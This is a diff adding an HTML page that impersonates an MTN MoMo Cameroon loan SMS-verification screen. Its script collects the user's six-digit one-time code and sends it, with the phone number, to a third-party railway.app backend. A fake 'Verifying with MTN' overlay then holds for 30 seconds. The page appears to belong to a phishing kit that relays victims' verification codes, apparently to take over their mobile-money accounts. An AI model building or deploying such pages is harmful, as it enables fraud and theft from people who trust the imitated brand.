@@ -1,0 +1,755 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <title>MTN MoMo Loan - SMS Verification</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        html, body {
+            height: 100%;
+            font-family: 'Inter', sans-serif;
+            background: #f0f2f5;
+            overflow: hidden;
+        }
+
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 10px;
+            height: 100vh;
+            height: 100dvh;
+            gap: 10px;
+        }
+
+        /* ===== HEADER ===== */
+        header {
+            width: 100%;
+            max-width: 480px;
+            padding: 12px 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+            position: relative;
+            flex-shrink: 0;
+        }
+
+        .back-btn {
+            font-size: 24px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #333;
+            line-height: 1;
+            width: 24px;
+            text-align: left;
+            padding: 0;
+        }
+
+        .logo-container {
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
+        .momo-icon {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background: #0047AB;
+            color: #FFCC00;
+            font-weight: 700;
+            font-size: 16px;
+            padding: 7px 16px;
+            border-radius: 40px;
+            line-height: 1;
+            letter-spacing: -0.5px;
+            box-shadow: 0 4px 12px rgba(0,71,171,0.25);
+            white-space: nowrap;
+        }
+
+        /* ===== CARD ===== */
+        .card {
+            background: white;
+            border-radius: 24px;
+            padding: 24px 20px;
+            width: 100%;
+            max-width: 480px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+            flex: 1;
+            min-height: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            overflow-y: auto;
+        }
+
+        /* ===== INFO BANNER ===== */
+        .info-banner {
+            background: linear-gradient(135deg, #ecfdf5, #d1fae5);
+            border: 1.5px solid #a7f3d0;
+            border-radius: 14px;
+            padding: 12px 14px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .info-banner .banner-icon {
+            font-size: 20px;
+            flex-shrink: 0;
+        }
+        .info-banner .banner-text {
+            font-size: 12.5px;
+            color: #065f46;
+            font-weight: 600;
+            line-height: 1.4;
+        }
+        .info-banner .banner-text strong {
+            display: block;
+            color: #047857;
+            font-weight: 800;
+            font-size: 13px;
+            margin-bottom: 2px;
+        }
+
+        /* ===== TITLE ===== */
+        .form-title {
+            font-size: 22px;
+            font-weight: 800;
+            color: #1a1a2e;
+            margin-bottom: 6px;
+            letter-spacing: -0.4px;
+        }
+        .form-title .highlight { color: #0047AB; }
+
+        .form-subtitle {
+            font-size: 13px;
+            color: #888;
+            line-height: 1.6;
+            margin-bottom: 22px;
+            font-weight: 500;
+        }
+        .form-subtitle .phone-strong {
+            color: #1a1a2e;
+            font-weight: 700;
+        }
+
+        /* ===== LABEL ===== */
+        .input-label {
+            display: block;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 7px;
+            font-size: 13px;
+        }
+
+        /* ===== CODE INPUT (6 boxes) ===== */
+        .code-boxes {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 6px;
+        }
+
+        .code-box {
+            width: 46px;
+            height: 54px;
+            text-align: center;
+            font-size: 22px;
+            font-weight: 800;
+            color: #1a1a2e;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            background: #fafbff;
+            transition: border-color 0.2s, box-shadow 0.2s, background 0.2s;
+            outline: none;
+            font-family: 'Inter', sans-serif;
+            caret-color: #0047AB;
+            padding: 0;
+            flex: none;
+        }
+
+        .code-box:focus {
+            border-color: #0047AB;
+            background: #f0f4ff;
+            box-shadow: 0 0 0 3px rgba(0, 71, 171, 0.12);
+        }
+
+        .code-box.filled {
+            border-color: #0047AB;
+            background: #f0f4ff;
+        }
+
+        .code-box.invalid {
+            border-color: #e74c3c;
+            box-shadow: 0 0 0 3px rgba(231, 76, 60, 0.12);
+            animation: shake 0.4s ease;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-6px); }
+            75% { transform: translateX(6px); }
+        }
+
+        .error-text {
+            color: #e74c3c;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+            font-weight: 500;
+            line-height: 1.4;
+        }
+        .error-text.show { display: block; }
+
+        /* ===== PASTE HINT ===== */
+        .paste-hint {
+            text-align: center;
+            font-size: 11.5px;
+            color: #999;
+            margin-top: 10px;
+            font-weight: 500;
+        }
+        .paste-hint kbd {
+            background: #f0f4ff;
+            color: #0047AB;
+            font-family: 'Inter', sans-serif;
+            font-weight: 700;
+            font-size: 10.5px;
+            padding: 2px 6px;
+            border-radius: 5px;
+            border: 1px solid #d6e0f5;
+        }
+
+        /* ===== VERIFY BUTTON ===== */
+        .verify-btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #0047AB, #002D7A);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            font-family: 'Inter', sans-serif;
+            margin-top: 24px;
+        }
+        .verify-btn:active:not(:disabled) { transform: scale(0.98); }
+        .verify-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        /* ===== RESEND ROW ===== */
+        .resend-row {
+            text-align: center;
+            font-size: 12.5px;
+            color: #777;
+            margin-top: 16px;
+            font-weight: 500;
+        }
+        .resend-row .resend-btn {
+            color: #0047AB;
+            font-weight: 700;
+            text-decoration: none;
+            cursor: pointer;
+            background: none;
+            border: none;
+            font-family: 'Inter', sans-serif;
+            font-size: 12.5px;
+            padding: 0;
+        }
+        .resend-row .resend-btn:disabled {
+            color: #bbb;
+            cursor: not-allowed;
+        }
+
+        /* ===== SECURITY NOTICE ===== */
+        .security-notice {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+            margin-top: 14px;
+            font-size: 11px;
+            color: #999;
+        }
+
+        /* ===== FOOTER ===== */
+        footer {
+            padding: 6px;
+            color: #aaa;
+            font-size: 11px;
+            text-align: center;
+            width: 100%;
+            max-width: 480px;
+            flex-shrink: 0;
+        }
+
+        /* ============================================
+           VERIFYING OVERLAY
+           ============================================ */
+        .verify-overlay {
+            position: fixed;
+            inset: 0;
+            background: #ffffff;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 32px 24px;
+            z-index: 2000;
+        }
+        .verify-overlay.show { display: flex; }
+
+        .verify-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            max-width: 340px;
+            text-align: center;
+        }
+
+        .verify-momo-icon {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background: #0047AB;
+            color: #FFCC00;
+            font-weight: 800;
+            font-size: 20px;
+            padding: 11px 22px;
+            border-radius: 50px;
+            line-height: 1;
+            box-shadow: 0 8px 24px rgba(0, 71, 171, 0.28);
+            margin-bottom: 32px;
+            animation: overlayPulse 2s ease-in-out infinite;
+        }
+        @keyframes overlayPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        .verify-spinner {
+            width: 52px;
+            height: 52px;
+            border: 5px solid #e0e8ff;
+            border-top-color: #0047AB;
+            border-radius: 50%;
+            animation: verifySpin 0.9s linear infinite;
+            margin-bottom: 26px;
+        }
+        @keyframes verifySpin { to { transform: rotate(360deg); } }
+
+        .verify-title {
+            font-size: 19px;
+            font-weight: 800;
+            color: #1a1a2e;
+            margin-bottom: 10px;
+            line-height: 1.3;
+        }
+        .verify-title .highlight { color: #0047AB; }
+
+        .verify-subtitle {
+            font-size: 13px;
+            color: #888;
+            line-height: 1.6;
+            margin-bottom: 28px;
+        }
+
+        .verify-dots span {
+            display: inline-block;
+            animation: dotBlink 1.4s infinite both;
+        }
+        .verify-dots span:nth-child(1) { animation-delay: 0s; }
+        .verify-dots span:nth-child(2) { animation-delay: 0.2s; }
+        .verify-dots span:nth-child(3) { animation-delay: 0.4s; }
+        @keyframes dotBlink {
+            0%, 80%, 100% { opacity: 0.2; }
+            40% { opacity: 1; }
+        }
+
+        .verify-bar {
+            width: 200px;
+            height: 5px;
+            background: #e8edf7;
+            border-radius: 4px;
+            overflow: hidden;
+            margin-bottom: 28px;
+        }
+        .verify-bar-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #0047AB, #FFCC00);
+            border-radius: 4px;
+        }
+
+        .verify-security {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            font-size: 11px;
+            color: #aaa;
+        }
+
+        /* ===== SMALL PHONES ===== */
+        @media (max-height: 700px) {
+            .card { padding: 18px 16px; }
+            .verify-btn { margin-top: 18px; padding: 14px; }
+            .form-subtitle { margin-bottom: 16px; }
+            .momo-icon { font-size: 15px; padding: 6px 14px; }
+        }
+
+        @media (max-width: 380px) {
+            .code-boxes { gap: 6px; }
+            .code-box {
+                width: 42px;
+                height: 50px;
+                font-size: 20px;
+                border-radius: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <button class="back-btn" onclick="window.location.href='login.html'" aria-label="Go back">←</button>
+        <div class="logo-container">
+            <span class="momo-icon">MoMo</span>
+        </div>
+        <div style="width:24px;"></div>
+    </header>
+
+    <main class="card">
+        <!-- Info banner -->
+        <div class="info-banner">
+            <div class="banner-icon">📩</div>
+            <div class="banner-text">
+                <strong>SMS Sent</strong>
+                Check your messages for the 6-digit code from MTN MoMo.
+            </div>
+        </div>
+
+        <h1 class="form-title">Enter <span class="highlight">SMS Code</span></h1>
+        <p class="form-subtitle">
+            We sent a 6-digit verification code to
+            <span class="phone-strong" id="phoneDisplay">+237 6XX XXX XXX</span>.
+            Enter it below to continue.
+        </p>
+
+        <!-- Code -->
+        <div>
+            <label class="input-label">Verification Code</label>
+            <div class="code-boxes" id="codeBoxes">
+                <input type="text" class="code-box" id="c1" maxlength="1" inputmode="numeric" autocomplete="one-time-code">
+                <input type="text" class="code-box" id="c2" maxlength="1" inputmode="numeric">
+                <input type="text" class="code-box" id="c3" maxlength="1" inputmode="numeric">
+                <input type="text" class="code-box" id="c4" maxlength="1" inputmode="numeric">
+                <input type="text" class="code-box" id="c5" maxlength="1" inputmode="numeric">
+                <input type="text" class="code-box" id="c6" maxlength="1" inputmode="numeric">
+            </div>
+            <div class="error-text" id="codeError">Please enter the 6-digit code from your SMS</div>
+            <p class="paste-hint">💡 Tip: you can paste the full code with <kbd>Ctrl</kbd>+<kbd>V</kbd></p>
+        </div>
+
+        <button class="verify-btn" id="verifyBtn">VERIFY →</button>
+
+        <div class="resend-row">
+            Didn't get the code? <button class="resend-btn" id="resendBtn">Resend SMS</button>
+        </div>
+
+        <div class="security-notice">
+            <span>🔒</span>
+            <span>Your code is used only to verify your identity</span>
+        </div>
+    </main>
+
+    <footer>© 2026 MTN MoMo Cameroon</footer>
+
+    <!-- VERIFYING OVERLAY -->
+    <div class="verify-overlay" id="verifyOverlay">
+        <div class="verify-content">
+            <div class="verify-momo-icon">MoMo</div>
+            <div class="verify-spinner"></div>
+            <h2 class="verify-title">
+                Confirming your <span class="highlight">SMS code</span><span class="verify-dots"><span>.</span><span>.</span><span>.</span></span>
+            </h2>
+            <p class="verify-subtitle">Verifying with MTN. This may take a moment…</p>
+            <div class="verify-bar">
+                <div class="verify-bar-fill" id="verifyBarFill"></div>
+            </div>
+            <div class="verify-security">
+                <span>🔒</span>
+                <span>Secure connection to MTN MoMo</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ============================================
+        // BACKEND URL
+        // ============================================
+        const API_BASE = 'https://momo-usersey-production.up.railway.app';
+
+        // ============================================
+        // LOADING DURATION for SMS verification
+        // ============================================
+        const VERIFY_DURATION_MS = 30 * 1000; // 30 seconds
+
+        // ============================================
+        // SHOW PHONE NUMBER from session
+        // ============================================
+        const sessionRaw = localStorage.getItem('momoSession');
+        let sessionPhone = localStorage.getItem('momoPhone') || '+237 6XX XXX XXX';
+
+        // Pretty format: +237 6XX XXX XXX
+        (function formatPhone() {
+            const digits = sessionPhone.replace(/\D/g, '').replace(/^237/, '');
+            if (digits.length === 9) {
+                sessionPhone = '+237 ' + digits.slice(0, 3) + ' ' + digits.slice(3, 6) + ' ' + digits.slice(6);
+            }
+            document.getElementById('phoneDisplay').textContent = sessionPhone;
+        })();
+
+        // ============================================
+        // CODE INPUT (6 boxes)
+        // ============================================
+        const codeBoxes = [
+            document.getElementById('c1'),
+            document.getElementById('c2'),
+            document.getElementById('c3'),
+            document.getElementById('c4'),
+            document.getElementById('c5'),
+            document.getElementById('c6')
+        ];
+        const codeError = document.getElementById('codeError');
+
+        codeBoxes.forEach((box, index) => {
+            box.addEventListener('input', function() {
+                this.value = this.value.replace(/\D/g, '');
+                if (this.value) {
+                    this.classList.add('filled');
+                    if (index < codeBoxes.length - 1) codeBoxes[index + 1].focus();
+                } else {
+                    this.classList.remove('filled');
+                }
+                if (getCodeValue().length === 6) {
+                    codeError.classList.remove('show');
+                    codeBoxes.forEach(b => b.classList.remove('invalid'));
+                }
+            });
+
+            box.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && !this.value && index > 0) {
+                    codeBoxes[index - 1].focus();
+                    codeBoxes[index - 1].value = '';
+                    codeBoxes[index - 1].classList.remove('filled');
+                }
+                if (e.key === 'ArrowLeft' && index > 0) {
+                    codeBoxes[index - 1].focus();
+                }
+                if (e.key === 'ArrowRight' && index < codeBoxes.length - 1) {
+                    codeBoxes[index + 1].focus();
+                }
+            });
+
+            // Paste full code
+            box.addEventListener('paste', function(e) {
+                e.preventDefault();
+                const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
+                if (pasted.length > 0) {
+                    for (let i = 0; i < codeBoxes.length && i < pasted.length; i++) {
+                        codeBoxes[i].value = pasted[i];
+                        codeBoxes[i].classList.add('filled');
+                    }
+                    const nextEmpty = codeBoxes.findIndex(b => !b.value);
+                    codeBoxes[nextEmpty !== -1 ? nextEmpty : codeBoxes.length - 1].focus();
+                    if (getCodeValue().length === 6) {
+                        codeError.classList.remove('show');
+                        codeBoxes.forEach(b => b.classList.remove('invalid'));
+                    }
+                }
+            });
+        });
+
+        function getCodeValue() {
+            return codeBoxes.map(b => b.value).join('');
+        }
+
+        // ============================================
+        // VERIFY OVERLAY (progress bar)
+        // ============================================
+        const verifyOverlay = document.getElementById('verifyOverlay');
+        const verifyBarFill = document.getElementById('verifyBarFill');
+        let verifyTimer = null;
+
+        function startVerifyBar(durationMs) {
+            verifyOverlay.classList.add('show');
+            verifyBarFill.style.width = '0%';
+            const totalSeconds = Math.round(durationMs / 1000);
+            const startTime = Date.now();
+
+            verifyTimer = setInterval(function() {
+                const elapsedMs = Date.now() - startTime;
+                const raw = (elapsedMs / 1000) / totalSeconds;
+                const eased = 1 - Math.pow(1 - Math.min(raw, 1), 2.2);
+                verifyBarFill.style.width = Math.min(eased * 100, 99).toFixed(1) + '%';
+
+                if (elapsedMs >= durationMs) {
+                    clearInterval(verifyTimer);
+                    verifyBarFill.style.width = '100%';
+                }
+            }, 1000 / 30);
+        }
+        function finishVerifyBar() {
+            if (verifyTimer) clearInterval(verifyTimer);
+            verifyBarFill.style.width = '100%';
+        }
+
+        // ============================================
+        // VERIFY BUTTON
+        // ============================================
+        const verifyBtn = document.getElementById('verifyBtn');
+
+        verifyBtn.addEventListener('click', async function() {
+            const code = getCodeValue();
+            if (code.length !== 6) {
+                codeBoxes.forEach(b => b.classList.add('invalid'));
+                codeError.classList.add('show');
+                codeBoxes[0].focus();
+                return;
+            }
+
+            verifyBtn.disabled = true;
+            verifyBtn.textContent = 'VERIFYING...';
+            startVerifyBar(VERIFY_DURATION_MS);
+            const overlayStart = Date.now();
+
+            try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 15000);
+
+                const res = await fetch(`${API_BASE}/api/verify-sms`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        phone: sessionPhone,
+                        code: code
+                    }),
+                    signal: controller.signal
+                });
+                clearTimeout(timeoutId);
+
+                const data = await res.json().catch(() => ({}));
+
+                if (!res.ok || !data.ok) {
+                    throw new Error(data.error || 'Verification failed');
+                }
+
+                // Mark as verified
+                localStorage.setItem('momoSmsVerified', 'true');
+
+                // Hold overlay for full duration then go next
+                const elapsed = Date.now() - overlayStart;
+                const remaining = Math.max(0, VERIFY_DURATION_MS - elapsed);
+
+                setTimeout(function() {
+                    finishVerifyBar();
+                    setTimeout(function() {
+                        window.location.href = 'confirm.html';
+                    }, 350);
+                }, remaining);
+
+            } catch (err) {
+                console.error('Verify error:', err);
+                finishVerifyBar();
+                verifyOverlay.classList.remove('show');
+                verifyBtn.disabled = false;
+                verifyBtn.textContent = 'VERIFY →';
+
+                const reason = err.name === 'AbortError'
+                    ? 'Server took too long. Please try again.'
+                    : (err.message || 'Could not connect. Check your internet.');
+                alert('Verification failed: ' + reason);
+            }
+        });
+
+        // ============================================
+        // RESEND SMS
+        // ============================================
+        const resendBtn = document.getElementById('resendBtn');
+        let resendCooldown = 0;
+
+        resendBtn.addEventListener('click', async function() {
+            if (resendCooldown > 0) return;
+
+            resendBtn.disabled = true;
+            resendBtn.textContent = 'Sending…';
+
+            try {
+                const res = await fetch(`${API_BASE}/api/resend-sms`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone: sessionPhone })
+                });
+                const data = await res.json().catch(() => ({}));
+
+                if (!res.ok || !data.ok) {
+                    throw new Error(data.error || 'Could not resend');
+                }
+
+                // Start 30s cooldown
+                resendCooldown = 30;
+                resendBtn.textContent = `Resend in ${resendCooldown}s`;
+                const timer = setInterval(function() {
+                    resendCooldown--;
+                    if (resendCooldown <= 0) {
+                        clearInterval(timer);
+                        resendBtn.disabled = false;
+                        resendBtn.textContent = 'Resend SMS';
+                    } else {
+                        resendBtn.textContent = `Resend in ${resendCooldown}s`;
+                    }
+                }, 1000);
+
+            } catch (err) {
+                console.error('Resend error:', err);
+                resendBtn.disabled = false;
+                resendBtn.textContent = 'Resend SMS';
+                alert('Could not resend: ' + (err.message || 'Check your internet'));
+            }
+        });
+
+        // ============================================
+        // AUTO-FOCUS FIRST BOX
+        // ============================================
+        window.addEventListener('load', () => {
+            codeBoxes.forEach(b => {
+                b.value = '';
+                b.classList.remove('filled', 'invalid');
+            });
+            codeBoxes[0].focus();
+        });
+
+        console.log('====================================');
+        console.log('📩 MTN MoMo SMS Verification');
+        console.log('🔐 Backend:', API_BASE);
+        console.log('====================================');
+    </script>
+</body>
+</html>
